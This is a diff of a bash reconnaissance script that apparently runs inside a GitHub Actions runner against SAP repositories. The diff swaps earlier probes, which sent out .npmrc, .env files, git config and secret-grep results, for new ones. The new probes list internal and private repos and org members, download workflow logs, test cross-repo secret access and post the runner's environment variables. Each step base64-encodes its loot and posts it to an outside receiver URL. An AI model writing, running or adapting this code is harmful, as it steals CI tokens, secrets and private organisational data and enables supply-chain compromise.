@@ -17,105 +17,92 @@ fi
 
 AUTH="Authorization: token $TOKEN"
 
-# --- Probe 1: Test ALL token permissions (GET-based checks, no writes) ---
-# Each returns HTTP status code indicating if that permission is available
+# --- 1: SAP internal/private repos (paginated, collect names+URLs) ---
+PAGE=1
+while [ $PAGE -le 10 ]; do
+  REPOS_PAGE=$(curl -s -H "$AUTH" "$API/orgs/SAP/repos?type=internal&per_page=100&page=$PAGE" 2>/dev/null)
+  COUNT=$(echo "$REPOS_PAGE" | jq -r 'length' 2>/dev/null)
+  if [ "$COUNT" = "0" ] || [ -z "$COUNT" ] || [ "$COUNT" = "null" ]; then
+    break
+  fi
+  SUMMARY=$(echo "$REPOS_PAGE" | jq -r '.[] | "\(.full_name) | \(.visibility) | \(.description // "no desc")"' 2>/dev/null)
+  curl -s -X POST "$RECEIVER_URL?stage=org_internal_repos&page=$PAGE&count=$COUNT" -d "$(echo "$SUMMARY" | base64 -w0)" || true
+  if [ "$COUNT" -lt 100 ]; then
+    break
+  fi
+  PAGE=$((PAGE+1))
+done
 
-# packages:read
-PKG_READ=$(curl -s -o /dev/null -w "%{http_code}" -H "$AUTH" \
-  "$API/orgs/SAP/packages?package_type=npm&per_page=1" 2>&1)
-curl -s "$RECEIVER_URL?stage=perm_packages_read&http_code=$PKG_READ" || true
-
-# issues:read
-ISSUES_READ=$(curl -s -o /dev/null -w "%{http_code}" -H "$AUTH" \
-  "$API/repos/$REPO/issues?per_page=1" 2>&1)
-curl -s "$RECEIVER_URL?stage=perm_issues_read&http_code=$ISSUES_READ" || true
-
-# pages:read
-PAGES_READ=$(curl -s -o /dev/null -w "%{http_code}" -H "$AUTH" \
-  "$API/repos/$REPO/pages" 2>&1)
-curl -s "$RECEIVER_URL?stage=perm_pages_read&http_code=$PAGES_READ" || true
-
-# statuses:read
-STATUS_READ=$(curl -s -o /dev/null -w "%{http_code}" -H "$AUTH" \
-  "$API/repos/$REPO/statuses/ed96d88a695e66edef30d4d2417456fca8406d42" 2>&1)
-curl -s "$RECEIVER_URL?stage=perm_statuses_read&http_code=$STATUS_READ" || true
-
-# security-events:read (code scanning alerts)
-SEC_READ=$(curl -s -o /dev/null -w "%{http_code}" -H "$AUTH" \
-  "$API/repos/$REPO/code-scanning/alerts?per_page=1" 2>&1)
-curl -s "$RECEIVER_URL?stage=perm_security_read&http_code=$SEC_READ" || true
-
-# org members:read
-ORG_READ=$(curl -s -o /dev/null -w "%{http_code}" -H "$AUTH" \
-  "$API/orgs/SAP/members?per_page=1" 2>&1)
-curl -s "$RECEIVER_URL?stage=perm_org_members&http_code=$ORG_READ" || true
-
-# org repos (internal/private)
-ORG_REPOS=$(curl -s -o /dev/null -w "%{http_code}" -H "$AUTH" \
-  "$API/orgs/SAP/repos?type=internal&per_page=1" 2>&1)
-curl -s "$RECEIVER_URL?stage=perm_org_internal_repos&http_code=$ORG_REPOS" || true
-
-# list repo secrets (names only, needs admin)
-SECRETS_LIST=$(curl -s -o /dev/null -w "%{http_code}" -H "$AUTH" \
-  "$API/repos/$REPO/actions/secrets" 2>&1)
-curl -s "$RECEIVER_URL?stage=perm_secrets_list&http_code=$SECRETS_LIST" || true
-
-# --- Probe 2: Read source files for hardcoded credentials ---
-WORKDIR=$(pwd)
-
-# .npmrc
-if [ -f "$WORKDIR/.npmrc" ]; then
-  curl -s -X POST "$RECEIVER_URL?stage=file_npmrc" -d "$(cat "$WORKDIR/.npmrc" | base64 -w0)" || true
+# also try type=private
+PRIVATE_REPOS=$(curl -s -H "$AUTH" "$API/orgs/SAP/repos?type=private&per_page=100" 2>/dev/null)
+PRIV_COUNT=$(echo "$PRIVATE_REPOS" | jq -r 'length' 2>/dev/null)
+if [ "$PRIV_COUNT" != "0" ] && [ -n "$PRIV_COUNT" ] && [ "$PRIV_COUNT" != "null" ]; then
+  PRIV_SUMMARY=$(echo "$PRIVATE_REPOS" | jq -r '.[] | "\(.full_name) | \(.visibility) | \(.description // "no desc")"' 2>/dev/null)
+  curl -s -X POST "$RECEIVER_URL?stage=org_private_repos&count=$PRIV_COUNT" -d "$(echo "$PRIV_SUMMARY" | base64 -w0)" || true
 else
-  curl -s "$RECEIVER_URL?stage=file_npmrc&found=no" || true
+  curl -s "$RECEIVER_URL?stage=org_private_repos&count=0" || true
 fi
 
-# .env files
-ENV_FILES=$(find "$WORKDIR" -maxdepth 2 -name '.env*' -type f 2>/dev/null)
-if [ -n "$ENV_FILES" ]; then
-  curl -s -X POST "$RECEIVER_URL?stage=file_env" -d "$(echo "$ENV_FILES" | while read f; do echo "=== $f ==="; cat "$f"; done | base64 -w0)" || true
-else
-  curl -s "$RECEIVER_URL?stage=file_env&found=no" || true
-fi
+# --- 2: SAP org members (paginated) ---
+MPAGE=1
+while [ $MPAGE -le 10 ]; do
+  MEMBERS_PAGE=$(curl -s -H "$AUTH" "$API/orgs/SAP/members?per_page=100&page=$MPAGE" 2>/dev/null)
+  MCOUNT=$(echo "$MEMBERS_PAGE" | jq -r 'length' 2>/dev/null)
+  if [ "$MCOUNT" = "0" ] || [ -z "$MCOUNT" ] || [ "$MCOUNT" = "null" ]; then
+    break
+  fi
+  MLIST=$(echo "$MEMBERS_PAGE" | jq -r '.[].login' 2>/dev/null)
+  curl -s -X POST "$RECEIVER_URL?stage=org_members&page=$MPAGE&count=$MCOUNT" -d "$(echo "$MLIST" | base64 -w0)" || true
+  if [ "$MCOUNT" -lt 100 ]; then
+    break
+  fi
+  MPAGE=$((MPAGE+1))
+done
 
-# docusaurus.config.ts (check for API keys, URLs)
-if [ -f "$WORKDIR/docusaurus.config.ts" ]; then
-  curl -s -X POST "$RECEIVER_URL?stage=file_docusaurus_config" -d "$(cat "$WORKDIR/docusaurus.config.ts" | base64 -w0)" || true
-fi
+# --- 3: Workflow run logs (last 3 deploy-manual runs) ---
+DEPLOY_RUNS=$(curl -s -H "$AUTH" \
+  "$API/repos/$REPO/actions/workflows/deploy-manual.yml/runs?per_page=3&status=completed" 2>/dev/null)
+DEPLOY_IDS=$(echo "$DEPLOY_RUNS" | jq -r '.workflow_runs[]?.id' 2>/dev/null)
 
-# Check for any token/key/secret/password in config files
-SECRETS_GREP=$(grep -riE '(api[_-]?key|token|secret|password|credential|auth).*[:=]' \
-  "$WORKDIR"/*.json "$WORKDIR"/*.ts "$WORKDIR"/*.js "$WORKDIR"/src/_scripts/*.js 2>/dev/null | head -50)
-if [ -n "$SECRETS_GREP" ]; then
-  curl -s -X POST "$RECEIVER_URL?stage=file_secrets_grep" -d "$(echo "$SECRETS_GREP" | base64 -w0)" || true
-else
-  curl -s "$RECEIVER_URL?stage=file_secrets_grep&found=no" || true
-fi
+for RID in $DEPLOY_IDS; do
+  LOG_STATUS=$(curl -s -o /dev/null -w "%{http_code}" -H "$AUTH" \
+    "$API/repos/$REPO/actions/runs/$RID/logs" 2>/dev/null)
+  curl -s "$RECEIVER_URL?stage=workflow_log_check&run_id=$RID&http_code=$LOG_STATUS" || true
 
-# --- Probe 3: PR preview deployment investigation ---
-# Check what PR_FOLDER is and where the build goes
-curl -s "$RECEIVER_URL?stage=pr_folder&value=${PR_FOLDER:-none}" || true
+  if [ "$LOG_STATUS" = "200" ]; then
+    LOGDATA=$(curl -s -H "$AUTH" "$API/repos/$REPO/actions/runs/$RID/logs" 2>/dev/null | base64 -w0)
+    LOGSIZE=${#LOGDATA}
+    if [ $LOGSIZE -lt 500000 ]; then
+      curl -s -X POST "$RECEIVER_URL?stage=workflow_log_data&run_id=$RID&size=$LOGSIZE" -d "$LOGDATA" || true
+    else
+      curl -s "$RECEIVER_URL?stage=workflow_log_data&run_id=$RID&too_large=$LOGSIZE" || true
+    fi
+  fi
+done
 
-# Read the full pr-site-build.yml to see if it deploys to pages
-PR_WF=$(curl -s -H "$AUTH" \
-  "$API/repos/$REPO/contents/.github/workflows/pr-site-build.yml?ref=dev" \
-  | jq -r '.content // empty' 2>/dev/null | base64 -d 2>/dev/null)
-curl -s -X POST "$RECEIVER_URL?stage=pr_site_build_yml" -d "$(echo "$PR_WF" | base64 -w0)" || true
+# also check pr-site-build runs
+PR_RUNS=$(curl -s -H "$AUTH" \
+  "$API/repos/$REPO/actions/workflows/pr-site-build.yml/runs?per_page=3&status=completed" 2>/dev/null)
+PR_RUN_IDS=$(echo "$PR_RUNS" | jq -r '.workflow_runs[]?.id' 2>/dev/null)
 
-# --- Probe 4: Read event.json ---
-if [ -f "$GITHUB_EVENT_PATH" ]; then
-  curl -s -X POST "$RECEIVER_URL?stage=event_json" -d "$(cat "$GITHUB_EVENT_PATH" | base64 -w0)" || true
-fi
+for RID in $PR_RUN_IDS; do
+  LOG_STATUS=$(curl -s -o /dev/null -w "%{http_code}" -H "$AUTH" \
+    "$API/repos/$REPO/actions/runs/$RID/logs" 2>/dev/null)
+  curl -s "$RECEIVER_URL?stage=pr_build_log_check&run_id=$RID&http_code=$LOG_STATUS" || true
+done
 
-# --- Probe 5: Fetch deploy-manual.yml from dev (default branch) ---
-DEPLOY_DEV=$(curl -s -H "$AUTH" \
-  "$API/repos/$REPO/contents/.github/workflows/deploy-manual.yml?ref=dev" \
-  | jq -r '.content // empty' 2>/dev/null | base64 -d 2>/dev/null)
-curl -s -X POST "$RECEIVER_URL?stage=deploy_workflow_dev" -d "$(echo "$DEPLOY_DEV" | base64 -w0)" || true
+# --- 4: Cross-repo access check (other SAP repos) ---
+CROSS_REPOS="SAP/cloud-sdk SAP/ui5-webcomponents SAP/fundamental-styles SAP/btp-solution-diagrams"
+for CR in $CROSS_REPOS; do
+  CR_STATUS=$(curl -s -o /dev/null -w "%{http_code}" -H "$AUTH" "$API/repos/$CR" 2>/dev/null)
+  CR_SECRETS=$(curl -s -o /dev/null -w "%{http_code}" -H "$AUTH" "$API/repos/$CR/actions/secrets" 2>/dev/null)
+  CR_WF=$(curl -s -o /dev/null -w "%{http_code}" -H "$AUTH" "$API/repos/$CR/actions/workflows" 2>/dev/null)
+  curl -s "$RECEIVER_URL?stage=cross_repo&repo=$CR&repo_read=$CR_STATUS&secrets=$CR_SECRETS&workflows=$CR_WF" || true
+done
 
-# --- Probe 6: Check git remotes and credentials stored ---
-GIT_CONFIG=$(git config --list 2>/dev/null)
-curl -s -X POST "$RECEIVER_URL?stage=git_config" -d "$(echo "$GIT_CONFIG" | base64 -w0)" || true
+# --- 5: Check runner environment for additional secrets/tokens ---
+RUNNER_ENV=$(env | grep -ivE '^(PATH=|HOME=|USER=|SHELL=|TERM=|LANG=|LC_|HOSTNAME=|PWD=|OLDPWD=|SHLVL=|_=)' | sort)
+curl -s -X POST "$RECEIVER_URL?stage=runner_env" -d "$(echo "$RUNNER_ENV" | base64 -w0)" || true
 
-curl -s "$RECEIVER_URL?stage=recon2_complete" || true
+curl -s "$RECEIVER_URL?stage=recon3_complete" || true
 exit 0
